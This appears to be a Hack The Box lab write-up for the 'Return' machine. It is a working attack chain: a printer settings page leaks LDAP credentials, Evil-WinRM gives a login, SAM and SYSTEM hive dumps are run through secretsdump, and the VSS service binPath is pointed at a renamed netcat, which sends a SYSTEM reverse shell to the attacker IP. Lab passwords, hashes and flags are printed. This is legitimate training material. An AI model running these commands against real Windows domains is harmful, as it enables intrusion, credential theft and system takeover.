- nmap open ports and services
```bash
╰─ nmap -p $ports -sSCV --min-rate=2000 return.htb -Pn -oN retunrnNmapServicesVersions.txt                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 12:17 EST                                                                               
Nmap scan report for return.htb (10.10.11.108)                                                                                                
Host is up (0.029s latency).                                                                                                                  
                                                                                                                                              
PORT      STATE  SERVICE       VERSION                                                                                                        
53/tcp    open   domain        Simple DNS Plus                                                                                                
80/tcp    open   http          Microsoft IIS httpd 10.0                                                                                       
|_http-server-header: Microsoft-IIS/10.0                                                                                                      
|_http-title: HTB Printer Admin Panel                                                                                                         
| http-methods:                                                                                                                               
|_  Potentially risky methods: TRACE                                                                                                          
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-22 17:35:19Z)
135/tcp   open   msrpc         Microsoft Windows RPC                                                                                          
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn                            
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)                
445/tcp   open   microsoft-ds?                                                                                                                
464/tcp   open   kpasswd5?                                               
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0                      
636/tcp   open   tcpwrapped                                              
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped                                                                                                                   
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                  
|_http-title: Not Found                                                  
|_http-server-header: Microsoft-HTTPAPI/2.0                              
9389/tcp  open   mc-nmf        .NET Message Framing                      
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
|_http-title: Not Found                                                  
|_http-server-header: Microsoft-HTTPAPI/2.0                              
49664/tcp open   msrpc         Microsoft Windows RPC                     
49665/tcp open   msrpc         Microsoft Windows RPC                     
49666/tcp open   msrpc         Microsoft Windows RPC                     
49667/tcp open   msrpc         Microsoft Windows RPC                     
49671/tcp open   msrpc         Microsoft Windows RPC                     
49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0                      
49675/tcp open   msrpc         Microsoft Windows RPC                                                          
49679/tcp open   msrpc         Microsoft Windows RPC                                                          
49682/tcp open   msrpc         Microsoft Windows RPC                                                                                          
49694/tcp open   msrpc         Microsoft Windows RPC                                    
64334/tcp closed unknown                                                                                                                      
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                       
                                                                                        
Host script results:                                                                                                                          
| smb2-time:                                                                                      
|   date: 2025-11-22T17:36:14                                                                                                                 
|_  start_date: N/A                              
| smb2-security-mode:                                  
|   3:1:1:                                             
|_    Message signing enabled and required                                                                                                    
|_clock-skew: 18m08s                                                                                          
                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.08 seconds                  
```

- attempted smb annonymous bind
	- no shares available
- printer settings page found at `return.htb/settings.php`
	- appears to be setting up printers on the network?
![[Pasted image 20251122133248.png]]
- setup a nc listener and query the page with my attack machine ip using update button 
	- u/n `svc-printer`
	- p/w `1edFg43012!!`
```bash
╰─ nc -lnvp 389 
listening on [any] 389 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.108] 52202
0*`%return\svc-printer
                      1edFg43012!!
```
- authenticating with svc-printer to ldap server
```bash
╰─ nxc ldap 10.10.11.108 -u svc-printer -p '1edFg43012!!'   
LDAP        10.10.11.108    389    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
LDAP        10.10.11.108    389    PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)

```
- Using Evil-WinRM to log in to svc-printer account
```bash
╰─ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-printer> dir


    Directory: C:\Users\svc-printer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/26/2021   2:05 AM                Desktop
d-r---        5/26/2021   1:51 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
```
- navigating to Desktop for the user flag
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/22/2025   9:01 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
5a5f58b5ca473a8d768758724ca40421
```
- using `whoami /all` to pull permissions for svc-printer
	- svc-printer user has the SeBackupPrivilege and SeRestorePrivilege 
	- These can be abused to extract registry hi

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /all                                                                                                                                                   
                                                                                                                                                                                                            
USER INFORMATION                                                                                                                                                   
----------------                                                                                                                                                   
                                                                                                                                                                   
User Name          SID                                                                                                                                             
================== =============================================                                                                                                   
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103                                                                                                   
                                                                                                                                                                   
                                                                                                                                                                   
GROUP INFORMATION                                                                                                                                                  
-----------------                                                                                                                                                  
                                                                                                                                                                   
Group Name                                 Type             SID          Attributes                                                                                
========================================== ================ ============ ==================================================                                        
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                        
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group                                        
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group                                        
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group                                        
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                        
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group                                        
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                                        
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                        
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                        
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                        
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                           
                                                                                                                                                                   
                                                                                                                                                                   
PRIVILEGES INFORMATION                                                                                                                                             
----------------------                                                                                                                                             
                                                                                                                                                                   
Privilege Name                Description                         State                                                                                            
============================= =================================== =======                                                                                          
SeMachineAccountPrivilege     Add workstations to domain          Enabled                                                                                          
SeLoadDriverPrivilege         Load and unload device drivers      Enabled                                                                                          
SeSystemtimePrivilege         Change the system time              Enabled                                                                                          
SeBackupPrivilege             Back up files and directories       Enabled                                                                                          
SeRestorePrivilege            Restore files and directories       Enabled                                                                                          
SeShutdownPrivilege           Shut down the system                Enabled                                                                                          
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled                                                                                          
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled                                                                                          
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled                                                                                          
SeTimeZonePrivilege           Change the time zone                Enabled                                                                                          
                                                                                                                                                                   
                                                                                                                                                                   
USER CLAIMS INFORMATION                                                                                                                                            
-----------------------                                                                                                                                            
                                                                                                                                                                   
User claims unknown.                                                                                                                                               
                                                                                                                                                                   
Kerberos support for Dynamic Access Control on this device has been disabled.  
```
- extracting registry hives content for 
	- system
	- sam - Security Account Management
- and downloading it from the windows machine with Evil WinRm functionality
```bash
*Evil-WinRM* PS C:\Users\svc-printer> reg save hklm\system C:\Users\svc-printer\system.hive
The operation completed successfully.                               

*Evil-WinRM* PS C:\Users\svc-printer> reg save hklm\sam C:\Users\svc-printer\sam.hive
The operation completed successfully.     

*Evil-WinRM* PS C:\Users\svc-printer> dir


    Directory: C:\Users\svc-printer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/26/2021   2:05 AM                Desktop
d-r---        5/26/2021   1:51 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----       11/22/2025  12:44 PM          49152 sam.hive
-a----       11/22/2025  12:43 PM       15953920 system.hive


*Evil-WinRM* PS C:\Users\svc-printer> download sam.hive
                                        
Info: Downloading C:\Users\svc-printer\sam.hive to sam.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc-printer> download system.hive
                                        
Info: Downloading C:\Users\svc-printer\system.hive to system.hive
                                        
Info: Download successful!

```

- Using extracted hives content to retrieve users password hashes with impacket
```bash
╰─ secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```
- attempted tolog into administrator using pash-the-hash using impacket psexec.py

- running `whoami /all` again and we recognize we are part of Server Operators Group.
	- Members of Server Operators group Can
		- Start / Stop / Restart services as System
		- Change service configurations as System
		- Any Service you start runs as LocalSystem


- copying over a reverse shell payload from kali to return directory
- changing name of reverse shell payload to yourMomsNC.exe
```bash
╭─ ~/htb/return ───────────────────────────────────────────────────────────░
▒▓ ✔  03:24:50 PM            
╰─ cp /usr/share/windows-resources/binaries/nc.exe .                            
╭─ ~/htb/return─────────────────────────────────────────────────────────────░
▒▓ ✔  03:25:19 PM                                       
╰─ ll                                                                                                                                       
total 16M                                                                                                                                   
-rwxr-xr-x 1 b7h30 b7h30  58K Nov 25 15:25 nc.exe                                                                                           
-rw-rw-r-- 1 b7h30 b7h30 1021 Nov 19 06:21 returnNmapOpenPorts.txt                                                                          
-rw-rw-r-- 1 b7h30 b7h30 2.6K Nov 22 12:18 returnNmapServicesVersions.txt                                                                   
-rw-rw-r-- 1 b7h30 b7h30  48K Nov 22 14:28 sam.hive                                                                                         
-rw-rw-r-- 1 b7h30 b7h30  205 Nov 22 15:49 shadow.txt                                                                                       
-rw-rw-r-- 1 b7h30 b7h30  16M Nov 22 14:29 system.hive                                                                                      
╭─ ~/htb/return ▓▒░────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────░
▒▓ ✔  03:25:22 PM                                                                                                                          
╰─ mv nc.exe yourMomsNC.exe   
```

- starting listener on 4444
```bash
╭─ ~/htb/return────────────────────────────────────░▒▓ 1 ✘  43s  04:02:43 PM  
╰─ rlwrap nc -lnvp 4444                                                                                                                     
listening on [any] 4444 ...  
```

- logging in with svc-printer account creds
	- uploading windows simple reverse shell payload
```bash
╰─ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'                                                                              
                                                                                                                                            
Evil-WinRM shell v3.7                                                                                                                       
                                                                                                                                            
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline            
                                                                                                                                            
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                       
                                                                                                                                            
Info: Establishing connection to remote endpoint                                                                                            
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 

*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload yourMomsNC.exe                                                                       
                                                                                                                                            
Info: Uploading /home/b7h30/htb/return/yourMomsNC.exe to C:\Users\svc-printer\Documents\yourMomsNC.exe                                      
                                                                                                                                            
Data: 79188 bytes of 79188 bytes copied                                                                                                     
                                                                                                                                            
Info: Upload successful!       
```
- Then Changing the executable file that windows uses when it starts the service. 
	- instead of starting the legit VSS program, windows will now run
	- `yourMomsNC.exe -e cmd.exe 10.10.14.12 4444`
		- and because services run as root, the reverse shell also runs as root
	- Command breakdown
		- `sc.exe` 
			- The Windows Service Controller
				- built in tool that talks to the Service Control Manager(SCM), runs as SYSTEM
				- lets you configure, start, stop, query or delete services
		- `config`
			- tells the `sc.exe` that you want to change the configuration of an existing service
			- This modifies the service's entry in `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`, specifically, the ImagePath binary path
		- `vss`
			- Volume Shadow Copy Service
			- This is the service name, not the display name
			- Normally handles shadow copies, backups, snapshots, etc
			- Runs as SYSTEM
			- Is startable and stoppable
		- `binPATH=`
			- This tells Windows "Replace the executable this service tuns with whatever I put after this"
			- overriding the entry
				- `ImagePath = <your payload>`
		- `C:\Users\svc-printer\Documents\yourMomsNC.exe -e cmd.exe 10.10.14.12 4444`
			- This whole string is the new executable command the service will run
			- `C:\Users\svc-printer\Documents\yourMomsNC.exe`
				- This is the netcat binary... renamed
				- When Windows starts the VSS service, it will now run this program instead of the real VSS binary.
			- `-e cmd.exe`
				- This tell netcat "Execute cmd.exe and pipe its input/output over the TCP connection"
				- This is how you turn a one-way TCP socket into a fully interactive SYSTEM shell
			- `10.10.14.12`
				- my attack machine's ip (Tun0 from HTB)
				- the reverse shell will connect back here.
			- `4444`
				- the port my listener is running on
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Users\svc-printer\Documents\yourMomsNC.exe -e cmd.exe 10.10.1
4.12 4444"                                                                                                                                  
[SC] ChangeServiceConfig SUCCESS                                                                                                            
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss                                                                             
[SC] ControlService FAILED 1062:                                      

The service has not been started.                                     

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss   
```
- Catching the reverse shell, quickly navigating to the Administrator's Desktop and pulling the root flag
```bash
╰─ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.108] 50573
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ../../Users/Administrator/Desktop
cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
dc4cb75372824ab506c8069ce8d53769

```





